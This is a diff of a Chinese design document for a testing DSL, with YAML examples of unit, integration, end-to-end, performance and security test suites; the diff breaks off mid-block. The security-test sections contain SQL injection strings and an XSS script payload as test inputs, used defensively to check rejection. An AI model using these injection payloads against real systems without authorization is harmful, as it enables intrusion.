@@ -1,1598 +1,1458 @@
-# 测试模型DSL草案
+# 测试模型DSL设计 (Testing Model DSL Design)
 
-## 1. 设计目标
+## 概述
 
-- 用统一DSL描述测试用例、断言、覆盖率、性能等测试要素
-- 支持自动生成pytest、JUnit、Cucumber、JMeter等主流测试脚本和配置
-- 提供形式化验证和自动化推理能力
-- 支持多语言、多框架的测试代码生成
-- 实现测试用例的自动生成和优化
+测试模型DSL是一种专门用于描述和管理软件测试的领域特定语言。它提供声明式语法来定义测试用例、测试套件、测试策略和测试环境，支持从单元测试到端到端测试的各种测试场景。
 
-## 2. 基本语法结构
+## 设计原则
 
-### 2.1 单元测试 (Unit Testing)
+### 核心原则
 
-```dsl
-unit_test UserServiceTest {
-  class: "com.example.UserService"
-  framework: "junit5"
-  
-  test_cases: [
-    {
-      name: "testCreateUserSuccess"
-      description: "测试用户创建成功"
-      method: "createUser"
-      inputs: {
-        username: "testuser"
-        email: "test@example.com"
-        password: "password123"
+1. **声明式设计**：使用声明式语法描述测试逻辑，而非命令式代码
+2. **测试驱动**：支持测试驱动开发（TDD）和行为驱动开发（BDD）
+3. **可组合性**：支持测试用例的组合和重用
+4. **可维护性**：易于理解和维护的测试结构
+5. **可扩展性**：支持自定义测试类型和扩展
+
+### 设计模式
+
+```yaml
+# 设计模式
+design_patterns:
+  test_case_pattern:
+    description: "测试用例模式"
+    benefits:
+      - "清晰的测试结构"
+      - "易于维护"
+      - "可重用性"
+    example: |
+      test_case "user_login_success" {
+        description: "用户登录成功测试"
+        given: "用户已注册且密码正确"
+        when: "用户输入正确的用户名和密码"
+        then: "用户成功登录并跳转到主页"
+        
+        steps: [
+          { action: "navigate_to_login_page" },
+          { action: "enter_username", data: "testuser" },
+          { action: "enter_password", data: "password123" },
+          { action: "click_login_button" },
+          { action: "verify_redirect_to_homepage" }
+        ]
       }
-      mocks: {
-        userRepository: {
-          save: "return_success"
-          findByUsername: "return_null"
+      
+  test_suite_pattern:
+    description: "测试套件模式"
+    benefits:
+      - "测试组织"
+      - "批量执行"
+      - "依赖管理"
+    example: |
+      test_suite "user_management" {
+        description: "用户管理功能测试套件"
+        priority: "high"
+        
+        test_cases: [
+          "user_login_success",
+          "user_login_failure",
+          "user_registration",
+          "user_profile_update"
+        ]
+        
+        setup: "create_test_user"
+        teardown: "cleanup_test_data"
+      }
+      
+  bdd_pattern:
+    description: "行为驱动开发模式"
+    benefits:
+      - "业务导向"
+      - "可读性强"
+      - "协作友好"
+    example: |
+      feature "User Authentication" {
+        description: "用户认证功能"
+        
+        scenario "Successful Login" {
+          given: "用户已注册"
+          and: "用户密码正确"
+          when: "用户尝试登录"
+          then: "登录成功"
+          and: "用户被重定向到主页"
         }
-        passwordEncoder: {
-          encode: "return_encoded_password"
+        
+        scenario "Failed Login" {
+          given: "用户已注册"
+          and: "用户密码错误"
+          when: "用户尝试登录"
+          then: "登录失败"
+          and: "显示错误消息"
         }
       }
-      assertions: [
-        {
-          type: "not_null"
-          target: "result"
-          message: "创建结果不应为空"
-        },
-        {
-          type: "equals"
-          target: "result.username"
-          expected: "testuser"
-          message: "用户名应匹配"
-        },
-        {
-          type: "verify"
-          target: "userRepository.save"
-          times: 1
-          message: "应调用保存方法一次"
-        }
+```
+
+## DSL语法设计
+
+### 基本语法结构
+
+```yaml
+# 基本语法
+basic_syntax:
+  test_definition: |
+    test <test_name> {
+      version: "<version>"
+      description: "<description>"
+      
+      test_cases: [
+        <test_case_definitions>
       ]
-    },
+      
+      test_suites: [
+        <test_suite_definitions>
+      ]
+      
+      test_environments: [
+        <environment_definitions>
+      ]
+      
+      test_data: [
+        <data_definitions>
+      ]
+    }
+    
+  test_case_definition: |
     {
-      name: "testCreateUserDuplicateUsername"
-      description: "测试创建重复用户名失败"
-      method: "createUser"
-      inputs: {
-        username: "existinguser"
-        email: "test@example.com"
-        password: "password123"
-      }
-      mocks: {
-        userRepository: {
-          findByUsername: "return_existing_user"
-        }
-      }
-      expected_exception: "UserAlreadyExistsException"
+      name: "<test_case_name>"
+      description: "<description>"
+      priority: "<priority>"
+      category: "<category>"
+      
+      setup: "<setup_action>"
+      teardown: "<teardown_action>"
+      
+      steps: [
+        <step_definitions>
+      ]
+      
       assertions: [
+        <assertion_definitions>
+      ]
+      
+      data_driven: {
+        <data_driven_configuration>
+      }
+    }
+    
+  step_definition: |
+    {
+      name: "<step_name>"
+      action: "<action_type>"
+      description: "<description>"
+      timeout: "<duration>"
+      retry: <number>
+      
+      parameters: {
+        <parameter_definitions>
+      }
+      
+      expected_result: "<expected_result>"
+    }
+```
+
+### 数据类型定义
+
+```yaml
+# 数据类型
+data_types:
+  test_types:
+    - name: "unit_test"
+      description: "单元测试"
+      scope: "单个函数或方法"
+      
+    - name: "integration_test"
+      description: "集成测试"
+      scope: "多个组件交互"
+      
+    - name: "system_test"
+      description: "系统测试"
+      scope: "整个系统"
+      
+    - name: "e2e_test"
+      description: "端到端测试"
+      scope: "完整用户流程"
+      
+    - name: "performance_test"
+      description: "性能测试"
+      scope: "系统性能指标"
+      
+    - name: "security_test"
+      description: "安全测试"
+      scope: "安全漏洞检测"
+      
+  priority_levels:
+    - name: "critical"
+      description: "关键"
+      value: 1
+      
+    - name: "high"
+      description: "高"
+      value: 2
+      
+    - name: "medium"
+      description: "中"
+      value: 3
+      
+    - name: "low"
+      description: "低"
+      value: 4
+      
+  test_categories:
+    - name: "functional"
+      description: "功能测试"
+      
+    - name: "non_functional"
+      description: "非功能测试"
+      
+    - name: "regression"
+      description: "回归测试"
+      
+    - name: "smoke"
+      description: "冒烟测试"
+      
+    - name: "sanity"
+      description: "健全性测试"
+```
+
+### 表达式语法
+
+```yaml
+# 表达式语法
+expression_syntax:
+  assertion_expressions:
+    - name: "equality"
+      syntax: "actual == expected"
+      example: "response.status_code == 200"
+      
+    - name: "inequality"
+      syntax: "actual != expected"
+      example: "response.status_code != 404"
+      
+    - name: "greater_than"
+      syntax: "actual > expected"
+      example: "response_time < 1000"
+      
+    - name: "less_than"
+      syntax: "actual < expected"
+      example: "memory_usage < 512"
+      
+    - name: "contains"
+      syntax: "actual.contains(expected)"
+      example: "response.body.contains('success')"
+      
+    - name: "matches"
+      syntax: "actual.matches(pattern)"
+      example: "email.matches('^[^@]+@[^@]+\\.[^@]+$')"
+      
+  data_expressions:
+    - name: "variable_reference"
+      syntax: "${variable_name}"
+      example: "${USER_ID}"
+      
+    - name: "function_call"
+      syntax: "function_name(parameters)"
+      example: "generate_random_email()"
+      
+    - name: "conditional_expression"
+      syntax: "condition ? value1 : value2"
+      example: "environment == 'prod' ? 'prod_url' : 'test_url'"
+```
+
+## 单元测试建模设计
+
+### 基本单元测试
+
+```yaml
+# 基本单元测试
+basic_unit_tests:
+  calculator_test: |
+    test_suite "calculator_tests" {
+      description: "计算器功能测试"
+      category: "unit"
+      
+      test_cases: [
         {
-          type: "exception"
-          exception_type: "UserAlreadyExistsException"
-          message: "用户名已存在"
+          name: "add_two_numbers"
+          description: "测试两个数字相加"
+          category: "functional"
+          priority: "high"
+          
+          setup: "create_calculator"
+          teardown: "cleanup_calculator"
+          
+          steps: [
+            {
+              name: "add_numbers"
+              action: "call_method"
+              parameters: {
+                method: "add"
+                arguments: [5, 3]
+              }
+              expected_result: 8
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_result"
+              expression: "result == 8"
+              message: "加法结果应该等于8"
+            }
+          ]
+        },
+        {
+          name: "divide_by_zero"
+          description: "测试除以零的异常处理"
+          category: "functional"
+          priority: "high"
+          
+          steps: [
+            {
+              name: "divide_by_zero"
+              action: "call_method"
+              parameters: {
+                method: "divide"
+                arguments: [10, 0]
+              }
+              expected_exception: "DivisionByZeroException"
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_exception"
+              expression: "exception instanceof DivisionByZeroException"
+              message: "应该抛出除零异常"
+            }
+          ]
         }
       ]
     }
-  ]
-  
-  setup: {
-    before_each: "setupTestData"
-    after_each: "cleanupTestData"
-  }
-}
+    
+  string_utils_test: |
+    test_suite "string_utils_tests" {
+      description: "字符串工具类测试"
+      category: "unit"
+      
+      test_cases: [
+        {
+          name: "reverse_string"
+          description: "测试字符串反转"
+          data_driven: {
+            data_source: "string_test_data.csv"
+            columns: ["input", "expected"]
+          }
+          
+          steps: [
+            {
+              name: "reverse_string"
+              action: "call_method"
+              parameters: {
+                method: "reverse"
+                arguments: ["${input}"]
+              }
+              expected_result: "${expected}"
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_reversed_string"
+              expression: "result == expected"
+              message: "反转后的字符串应该等于期望值"
+            }
+          ]
+        }
+      ]
+    }
 ```
 
-### 2.2 集成测试 (Integration Testing)
+### 高级单元测试
 
-```dsl
-integration_test OrderServiceIntegrationTest {
-  framework: "spring_boot_test"
-  profile: "test"
-  
-  test_cases: [
-    {
-      name: "testCompleteOrderFlow"
-      description: "测试完整订单流程"
-      steps: [
+```yaml
+# 高级单元测试
+advanced_unit_tests:
+  mock_test: |
+    test_suite "user_service_tests" {
+      description: "用户服务测试"
+      category: "unit"
+      
+      test_cases: [
         {
-          name: "create_user"
-          action: "POST /api/users"
-          body: {
-            username: "testuser"
-            email: "test@example.com"
-          }
-          assertions: [
+          name: "create_user_success"
+          description: "测试用户创建成功"
+          
+          setup: "setup_mocks"
+          teardown: "cleanup_mocks"
+          
+          mocks: [
             {
-              type: "status_code"
-              expected: 201
+              name: "user_repository"
+              type: "repository"
+              methods: [
+                {
+                  name: "save"
+                  return_value: "mock_user_id"
+                  called: true
+                }
+              ]
             },
             {
-              type: "json_path"
-              path: "$.id"
-              condition: "not_null"
+              name: "email_service"
+              type: "service"
+              methods: [
+                {
+                  name: "send_welcome_email"
+                  return_value: true
+                  called: true
+                }
+              ]
             }
           ]
-        },
-        {
-          name: "create_product"
-          action: "POST /api/products"
-          body: {
-            name: "Test Product"
-            price: 99.99
-            stock: 10
-          }
+          
+          steps: [
+            {
+              name: "create_user"
+              action: "call_method"
+              parameters: {
+                method: "createUser"
+                arguments: ["test@example.com", "password123"]
+              }
+              expected_result: "mock_user_id"
+            }
+          ]
+          
           assertions: [
             {
-              type: "status_code"
-              expected: 201
+              name: "check_user_created"
+              expression: "result == 'mock_user_id'"
+            },
+            {
+              name: "check_repository_called"
+              expression: "user_repository.save.called == true"
+            },
+            {
+              name: "check_email_sent"
+              expression: "email_service.send_welcome_email.called == true"
             }
           ]
-        },
+        }
+      ]
+    }
+    
+  parameterized_test: |
+    test_suite "validation_tests" {
+      description: "验证功能测试"
+      category: "unit"
+      
+      test_cases: [
         {
-          name: "create_order"
-          action: "POST /api/orders"
-          body: {
-            userId: "{{create_user.response.body.id}}"
-            items: [
-              {
-                productId: "{{create_product.response.body.id}}"
-                quantity: 2
-              }
+          name: "email_validation"
+          description: "测试邮箱验证"
+          data_driven: {
+            data: [
+              { email: "test@example.com", valid: true },
+              { email: "invalid-email", valid: false },
+              { email: "test@", valid: false },
+              { email: "@example.com", valid: false },
+              { email: "", valid: false }
             ]
           }
-          assertions: [
+          
+          steps: [
             {
-              type: "status_code"
-              expected: 201
-            },
-            {
-              type: "json_path"
-              path: "$.totalAmount"
-              expected: 199.98
-            }
-          ]
-        }
-      ]
-    }
-  ]
-  
-  test_data: {
-    database: {
-      schema: "test_schema.sql"
-      data: "test_data.sql"
-    }
-    cleanup: {
-      tables: ["users", "products", "orders"]
-      strategy: "truncate"
-    }
-  }
-}
-```
-
-### 2.3 端到端测试 (End-to-End Testing)
-
-```dsl
-e2e_test ECommerceE2ETest {
-  framework: "selenium"
-  browser: "chrome"
-  headless: true
-  
-  test_cases: [
-    {
-      name: "testUserRegistrationAndPurchase"
-      description: "测试用户注册和购买流程"
-      steps: [
-        {
-          name: "navigate_to_homepage"
-          action: "navigate"
-          url: "https://example.com"
-          assertions: [
-            {
-              type: "element_present"
-              selector: "#header"
-            }
-          ]
-        },
-        {
-          name: "click_register"
-          action: "click"
-          selector: "#register-link"
-          assertions: [
-            {
-              type: "element_present"
-              selector: "#registration-form"
-            }
-          ]
-        },
-        {
-          name: "fill_registration_form"
-          action: "fill_form"
-          form: {
-            "#username": "testuser"
-            "#email": "test@example.com"
-            "#password": "password123"
-            "#confirm-password": "password123"
-          }
-        },
-        {
-          name: "submit_registration"
-          action: "click"
-          selector: "#submit-registration"
-          assertions: [
-            {
-              type: "element_present"
-              selector: "#welcome-message"
-            },
-            {
-              type: "text_contains"
-              selector: "#welcome-message"
-              text: "Welcome"
-            }
-          ]
-        },
-        {
-          name: "search_product"
-          action: "fill"
-          selector: "#search-input"
-          value: "laptop"
-        },
-        {
-          name: "click_search"
-          action: "click"
-          selector: "#search-button"
-          assertions: [
-            {
-              type: "element_present"
-              selector: ".product-item"
-            }
-          ]
-        },
-        {
-          name: "add_to_cart"
-          action: "click"
-          selector: ".product-item:first-child .add-to-cart"
-          assertions: [
-            {
-              type: "element_present"
-              selector: "#cart-count"
-            },
-            {
-              type: "text_equals"
-              selector: "#cart-count"
-              text: "1"
-            }
-          ]
-        }
-      ]
-    }
-  ]
-  
-  configuration: {
-    implicit_wait: "10s"
-    page_load_timeout: "30s"
-    screenshot_on_failure: true
-    video_recording: true
-  }
-}
-```
-
-### 2.4 性能测试 (Performance Testing)
-
-```dsl
-performance_test OrderServiceLoadTest {
-  framework: "jmeter"
-  
-  test_plans: [
-    {
-      name: "user_registration_load"
-      description: "用户注册负载测试"
-      threads: {
-        users: 100
-        ramp_up: "60s"
-        duration: "300s"
-        loop_count: 10
-      }
-      requests: [
-        {
-          name: "register_user"
-          method: "POST"
-          url: "https://api.example.com/users"
-          headers: {
-            "Content-Type": "application/json"
-          }
-          body: {
-            username: "{{__RandomString(8)}}"
-            email: "{{__RandomString(8)}}@example.com"
-            password: "password123"
-          }
-          assertions: [
-            {
-              type: "response_code"
-              expected: 201
-            },
-            {
-              type: "response_time"
-              max: 2000
-            }
-          ]
-        }
-      ]
-    },
-    {
-      name: "order_creation_stress"
-      description: "订单创建压力测试"
-      threads: {
-        users: 500
-        ramp_up: "120s"
-        duration: "600s"
-        loop_count: 5
-      }
-      requests: [
-        {
-          name: "create_order"
-          method: "POST"
-          url: "https://api.example.com/orders"
-          headers: {
-            "Content-Type": "application/json"
-          }
-          body: {
-            userId: "{{__Random(1,1000)}}"
-            items: [
-              {
-                productId: "{{__Random(1,100)}}"
-                quantity: "{{__Random(1,5)}}"
+              name: "validate_email"
+              action: "call_method"
+              parameters: {
+                method: "isValidEmail"
+                arguments: ["${email}"]
               }
-            ]
-          }
+              expected_result: "${valid}"
+            }
+          ]
+          
           assertions: [
             {
-              type: "response_code"
-              expected: 201
-            },
-            {
-              type: "response_time"
-              max: 5000
+              name: "check_validation_result"
+              expression: "result == valid"
+              message: "邮箱验证结果应该与期望值一致"
             }
           ]
         }
       ]
     }
-  ]
-  
-  monitoring: {
-    metrics: [
-      "throughput",
-      "response_time",
-      "error_rate",
-      "cpu_usage",
-      "memory_usage"
-    ]
-    thresholds: {
-      max_response_time_p95: 2000
-      max_error_rate: 0.01
-      min_throughput: 100
-    }
-  }
-}
 ```
 
-### 2.5 安全测试 (Security Testing)
+## 集成测试建模设计
 
-```dsl
-security_test ApplicationSecurityTest {
-  framework: "owasp_zap"
-  
-  test_cases: [
-    {
-      name: "sql_injection_test"
-      description: "SQL注入测试"
-      target: "https://api.example.com/users"
-      method: "GET"
-      parameters: {
-        id: "' OR 1=1 --"
-      }
-      assertions: [
+### 基本集成测试
+
+```yaml
+# 基本集成测试
+basic_integration_tests:
+  api_integration_test: |
+    test_suite "api_integration_tests" {
+      description: "API集成测试"
+      category: "integration"
+      
+      setup: "start_test_server"
+      teardown: "stop_test_server"
+      
+      test_cases: [
         {
-          type: "no_sql_error"
-          message: "不应返回SQL错误"
+          name: "user_api_crud"
+          description: "测试用户API的CRUD操作"
+          priority: "high"
+          
+          steps: [
+            {
+              name: "create_user"
+              action: "http_post"
+              parameters: {
+                url: "${BASE_URL}/api/users"
+                headers: {
+                  "Content-Type": "application/json"
+                }
+                body: {
+                  "name": "Test User",
+                  "email": "test@example.com",
+                  "password": "password123"
+                }
+              }
+              expected_status: 201
+            },
+            {
+              name: "get_user"
+              action: "http_get"
+              parameters: {
+                url: "${BASE_URL}/api/users/${user_id}"
+              }
+              expected_status: 200
+            },
+            {
+              name: "update_user"
+              action: "http_put"
+              parameters: {
+                url: "${BASE_URL}/api/users/${user_id}"
+                headers: {
+                  "Content-Type": "application/json"
+                }
+                body: {
+                  "name": "Updated User",
+                  "email": "updated@example.com"
+                }
+              }
+              expected_status: 200
+            },
+            {
+              name: "delete_user"
+              action: "http_delete"
+              parameters: {
+                url: "${BASE_URL}/api/users/${user_id}"
+              }
+              expected_status: 204
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_user_created"
+              expression: "create_user_response.status == 201"
+            },
+            {
+              name: "check_user_retrieved"
+              expression: "get_user_response.body.name == 'Test User'"
+            },
+            {
+              name: "check_user_updated"
+              expression: "update_user_response.body.name == 'Updated User'"
+            },
+            {
+              name: "check_user_deleted"
+              expression: "delete_user_response.status == 204"
+            }
+          ]
+        }
+      ]
+    }
+    
+  database_integration_test: |
+    test_suite "database_integration_tests" {
+      description: "数据库集成测试"
+      category: "integration"
+      
+      setup: "setup_test_database"
+      teardown: "cleanup_test_database"
+      
+      test_cases: [
+        {
+          name: "user_repository_operations"
+          description: "测试用户仓库操作"
+          
+          steps: [
+            {
+              name: "create_user"
+              action: "database_insert"
+              parameters: {
+                table: "users"
+                data: {
+                  "name": "Test User",
+                  "email": "test@example.com",
+                  "created_at": "now()"
+                }
+              }
+            },
+            {
+              name: "find_user"
+              action: "database_select"
+              parameters: {
+                table: "users"
+                where: "email = 'test@example.com'"
+              }
+            },
+            {
+              name: "update_user"
+              action: "database_update"
+              parameters: {
+                table: "users"
+                data: {
+                  "name": "Updated User"
+                }
+                where: "email = 'test@example.com'"
+              }
+            },
+            {
+              name: "delete_user"
+              action: "database_delete"
+              parameters: {
+                table: "users"
+                where: "email = 'test@example.com'"
+              }
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_user_created"
+              expression: "create_user_result.affected_rows == 1"
+            },
+            {
+              name: "check_user_found"
+              expression: "find_user_result.rows.length == 1"
+            },
+            {
+              name: "check_user_updated"
+              expression: "update_user_result.affected_rows == 1"
+            },
+            {
+              name: "check_user_deleted"
+              expression: "delete_user_result.affected_rows == 1"
+            }
+          ]
+        }
+      ]
+    }
+```
+
+### 高级集成测试
+
+```yaml
+# 高级集成测试
+advanced_integration_tests:
+  microservice_integration_test: |
+    test_suite "microservice_integration_tests" {
+      description: "微服务集成测试"
+      category: "integration"
+      
+      setup: "start_microservices"
+      teardown: "stop_microservices"
+      
+      test_cases: [
+        {
+          name: "order_processing_flow"
+          description: "测试订单处理流程"
+          priority: "critical"
+          
+          steps: [
+            {
+              name: "create_order"
+              action: "http_post"
+              parameters: {
+                url: "${ORDER_SERVICE_URL}/api/orders"
+                body: {
+                  "customer_id": "customer_123",
+                  "items": [
+                    {
+                      "product_id": "product_456",
+                      "quantity": 2,
+                      "price": 29.99
+                    }
+                  ]
+                }
+              }
+              expected_status: 201
+            },
+            {
+              name: "verify_inventory_updated"
+              action: "http_get"
+              parameters: {
+                url: "${INVENTORY_SERVICE_URL}/api/products/product_456"
+              }
+              expected_status: 200
+            },
+            {
+              name: "verify_payment_processed"
+              action: "http_get"
+              parameters: {
+                url: "${PAYMENT_SERVICE_URL}/api/payments/${payment_id}"
+              }
+              expected_status: 200
+            },
+            {
+              name: "verify_notification_sent"
+              action: "http_get"
+              parameters: {
+                url: "${NOTIFICATION_SERVICE_URL}/api/notifications/${notification_id}"
+              }
+              expected_status: 200
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_order_created"
+              expression: "create_order_response.status == 201"
+            },
+            {
+              name: "check_inventory_reduced"
+              expression: "inventory_response.body.stock_quantity == original_stock - 2"
+            },
+            {
+              name: "check_payment_successful"
+              expression: "payment_response.body.status == 'completed'"
+            },
+            {
+              name: "check_notification_sent"
+              expression: "notification_response.body.status == 'sent'"
+            }
+          ]
+        }
+      ]
+    }
+```
+
+## 端到端测试建模设计
+
+### 基本端到端测试
+
+```yaml
+# 基本端到端测试
+basic_e2e_tests:
+  user_registration_flow: |
+    test_suite "user_registration_e2e" {
+      description: "用户注册端到端测试"
+      category: "e2e"
+      
+      setup: "start_application"
+      teardown: "stop_application"
+      
+      test_cases: [
+        {
+          name: "complete_registration_flow"
+          description: "完整的用户注册流程"
+          priority: "high"
+          
+          steps: [
+            {
+              name: "navigate_to_registration"
+              action: "browser_navigate"
+              parameters: {
+                url: "${BASE_URL}/register"
+              }
+            },
+            {
+              name: "fill_registration_form"
+              action: "browser_fill_form"
+              parameters: {
+                form_id: "registration-form"
+                fields: {
+                  "name": "Test User",
+                  "email": "test@example.com",
+                  "password": "password123",
+                  "confirm_password": "password123"
+                }
+              }
+            },
+            {
+              name: "submit_form"
+              action: "browser_click"
+              parameters: {
+                selector: "#submit-button"
+              }
+            },
+            {
+              name: "verify_success_message"
+              action: "browser_wait_for_element"
+              parameters: {
+                selector: ".success-message"
+                timeout: "10s"
+              }
+            },
+            {
+              name: "verify_redirect_to_login"
+              action: "browser_verify_url"
+              parameters: {
+                url: "${BASE_URL}/login"
+              }
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_success_message_displayed"
+              expression: "success_message_element.is_displayed()"
+            },
+            {
+              name: "check_current_url"
+              expression: "browser.current_url == '${BASE_URL}/login'"
+            }
+          ]
+        }
+      ]
+    }
+    
+  shopping_cart_flow: |
+    test_suite "shopping_cart_e2e" {
+      description: "购物车端到端测试"
+      category: "e2e"
+      
+      test_cases: [
+        {
+          name: "add_to_cart_and_checkout"
+          description: "添加商品到购物车并结账"
+          priority: "high"
+          
+          steps: [
+            {
+              name: "login_user"
+              action: "browser_login"
+              parameters: {
+                username: "testuser",
+                password: "password123"
+              }
+            },
+            {
+              name: "search_product"
+              action: "browser_search"
+              parameters: {
+                query: "laptop"
+              }
+            },
+            {
+              name: "add_to_cart"
+              action: "browser_click"
+              parameters: {
+                selector: ".add-to-cart-button"
+              }
+            },
+            {
+              name: "verify_cart_updated"
+              action: "browser_verify_text"
+              parameters: {
+                selector: ".cart-count",
+                text: "1"
+              }
+            },
+            {
+              name: "proceed_to_checkout"
+              action: "browser_click"
+              parameters: {
+                selector: ".checkout-button"
+              }
+            },
+            {
+              name: "fill_shipping_info"
+              action: "browser_fill_form"
+              parameters: {
+                form_id: "shipping-form"
+                fields: {
+                  "address": "123 Test St",
+                  "city": "Test City",
+                  "zip": "12345"
+                }
+              }
+            },
+            {
+              name: "complete_purchase"
+              action: "browser_click"
+              parameters: {
+                selector: ".purchase-button"
+              }
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_order_confirmation"
+              expression: "order_confirmation_element.is_displayed()"
+            },
+            {
+              name: "check_order_number_generated"
+              expression: "order_number_element.text != ''"
+            }
+          ]
+        }
+      ]
+    }
+```
+
+## 性能测试建模设计
+
+### 基本性能测试
+
+```yaml
+# 基本性能测试
+basic_performance_tests:
+  load_test: |
+    test_suite "load_tests" {
+      description: "负载测试"
+      category: "performance"
+      
+      test_cases: [
+        {
+          name: "api_load_test"
+          description: "API负载测试"
+          priority: "high"
+          
+          performance_config: {
+            virtual_users: 100
+            duration: "5m"
+            ramp_up: "1m"
+            ramp_down: "1m"
+          }
+          
+          steps: [
+            {
+              name: "login_users"
+              action: "http_post"
+              parameters: {
+                url: "${BASE_URL}/api/login"
+                body: {
+                  "username": "${username}",
+                  "password": "${password}"
+                }
+              }
+              weight: 30
+            },
+            {
+              name: "browse_products"
+              action: "http_get"
+              parameters: {
+                url: "${BASE_URL}/api/products"
+              }
+              weight: 40
+            },
+            {
+              name: "view_product_details"
+              action: "http_get"
+              parameters: {
+                url: "${BASE_URL}/api/products/${product_id}"
+              }
+              weight: 30
+            }
+          ]
+          
+          thresholds: [
+            {
+              name: "response_time_p95"
+              metric: "response_time"
+              percentile: 95
+              threshold: "500ms"
+              action: "fail"
+            },
+            {
+              name: "error_rate"
+              metric: "error_rate"
+              threshold: "1%"
+              action: "fail"
+            },
+            {
+              name: "throughput"
+              metric: "requests_per_second"
+              threshold: "100"
+              action: "warn"
+            }
+          ]
+        }
+      ]
+    }
+    
+  stress_test: |
+    test_suite "stress_tests" {
+      description: "压力测试"
+      category: "performance"
+      
+      test_cases: [
+        {
+          name: "api_stress_test"
+          description: "API压力测试"
+          
+          performance_config: {
+            virtual_users: 500
+            duration: "10m"
+            ramp_up: "2m"
+            ramp_down: "2m"
+          }
+          
+          steps: [
+            {
+              name: "heavy_operation"
+              action: "http_post"
+              parameters: {
+                url: "${BASE_URL}/api/heavy-operation"
+                body: {
+                  "data": "large_data_payload"
+                }
+              }
+            }
+          ]
+          
+          thresholds: [
+            {
+              name: "response_time_p99"
+              metric: "response_time"
+              percentile: 99
+              threshold: "2s"
+              action: "fail"
+            },
+            {
+              name: "memory_usage"
+              metric: "memory_usage"
+              threshold: "80%"
+              action: "warn"
+            },
+            {
+              name: "cpu_usage"
+              metric: "cpu_usage"
+              threshold: "90%"
+              action: "fail"
+            }
+          ]
+        }
+      ]
+    }
+```
+
+## 安全测试建模设计
+
+### 基本安全测试
+
+```yaml
+# 基本安全测试
+basic_security_tests:
+  authentication_test: |
+    test_suite "authentication_security_tests" {
+      description: "认证安全测试"
+      category: "security"
+      
+      test_cases: [
+        {
+          name: "sql_injection_test"
+          description: "SQL注入测试"
+          priority: "critical"
+          
+          steps: [
+            {
+              name: "attempt_sql_injection"
+              action: "http_post"
+              parameters: {
+                url: "${BASE_URL}/api/login"
+                body: {
+                  "username": "admin' OR '1'='1",
+                  "password": "password"
+                }
+              }
+              expected_status: 401
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_sql_injection_prevented"
+              expression: "response.status == 401"
+              message: "SQL注入应该被阻止"
+            }
+          ]
         },
         {
-          type: "no_sensitive_data"
-          message: "不应返回敏感数据"
+          name: "xss_test"
+          description: "XSS攻击测试"
+          priority: "critical"
+          
+          steps: [
+            {
+              name: "attempt_xss"
+              action: "http_post"
+              parameters: {
+                url: "${BASE_URL}/api/comments"
+                body: {
+                  "content": "<script>alert('XSS')</script>"
+                }
+              }
+            },
+            {
+              name: "verify_xss_prevented"
+              action: "http_get"
+              parameters: {
+                url: "${BASE_URL}/api/comments"
+              }
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_xss_prevented"
+              expression: "!response.body.content.includes('<script>')"
+              message: "XSS攻击应该被阻止"
+            }
+          ]
         }
       ]
-    },
-    {
-      name: "xss_test"
-      description: "XSS攻击测试"
-      target: "https://example.com/search"
-      method: "GET"
-      parameters: {
-        q: "<script>alert('XSS')</script>"
-      }
-      assertions: [
+    }
+    
+  authorization_test: |
+    test_suite "authorization_security_tests" {
+      description: "授权安全测试"
+      category: "security"
+      
+      test_cases: [
         {
-          type: "no_script_execution"
-          message: "不应执行脚本"
-        },
-        {
-          type: "input_sanitized"
-          message: "输入应被正确清理"
+          name: "unauthorized_access_test"
+          description: "未授权访问测试"
+          priority: "high"
+          
+          steps: [
+            {
+              name: "access_admin_endpoint"
+              action: "http_get"
+              parameters: {
+                url: "${BASE_URL}/api/admin/users"
+                headers: {
+                  "Authorization": "Bearer invalid_token"
+                }
+              }
+              expected_status: 401
+            }
+          ]
+          
+          assertions: [
+            {
+              name: "check_unauthorized_access_denied"
+              expression: "response.status == 401"
+              message: "未授权访问应该被拒绝"
+            }
+          ]
         }
       ]
-    },
-    {
-      name: "authentication_bypass_test"
-      description: "认证绕过测试"
-      target: "https://api.example.com/admin/users"
-      method: "GET"
-      headers: {
-        "Authorization": "Bearer invalid_token"
-      }
-      assertions: [
-        {
-          type: "status_code"
-          expected: 401
-          message: "应返回未授权状态"
-        }
-      ]
     }
-  ]
-  
-  scan_configuration: {
-    scan_level: "medium"
-    max_duration: "1h"
-    exclude_urls: ["/health", "/metrics"]
-  }
-}
 ```
 
-## 3. 高级特性
+## 完整示例
 
-### 3.1 数据驱动测试 (Data-Driven Testing)
+### 完整测试套件
 
-```dsl
-data_driven_test UserValidationTest {
-  framework: "pytest"
+```yaml
+# 完整测试套件示例
+test "ecommerce_application" {
+  version: "1.0.0"
+  description: "电商应用测试套件"
   
-  data_source: {
-    type: "csv"
-    file: "test_data/user_validation.csv"
-    columns: ["username", "email", "password", "expected_result"]
-  }
-  
-  test_template: {
-    name: "test_user_validation_{{username}}"
-    method: "validateUser"
-    inputs: {
-      username: "{{username}}"
-      email: "{{email}}"
-      password: "{{password}}"
-    }
-    assertions: [
-      {
-        type: "equals"
-        target: "result"
-        expected: "{{expected_result}}"
-      }
-    ]
-  }
-  
-  data_examples: [
-    {
-      username: "validuser",
-      email: "valid@example.com",
-      password: "password123",
-      expected_result: "valid"
-    },
-    {
-      username: "",
-      email: "invalid-email",
-      password: "123",
-      expected_result: "invalid"
-    }
-  ]
-}
-```
-
-### 3.2 参数化测试 (Parameterized Testing)
-
-```dsl
-parameterized_test MathOperationsTest {
-  framework: "junit5"
-  
-  parameters: [
-    {
-      name: "addition_test"
-      inputs: [
-        { a: 1, b: 2, expected: 3 },
-        { a: -1, b: 1, expected: 0 },
-        { a: 0, b: 0, expected: 0 }
-      ]
-      method: "add"
-    },
-    {
-      name: "multiplication_test"
-      inputs: [
-        { a: 2, b: 3, expected: 6 },
-        { a: -2, b: 4, expected: -8 },
-        { a: 0, b: 5, expected: 0 }
-      ]
-      method: "multiply"
-    }
-  ]
-  
-  test_template: {
-    method: "{{method}}"
-    inputs: {
-      a: "{{a}}"
-      b: "{{b}}"
-    }
-    assertions: [
-      {
-        type: "equals"
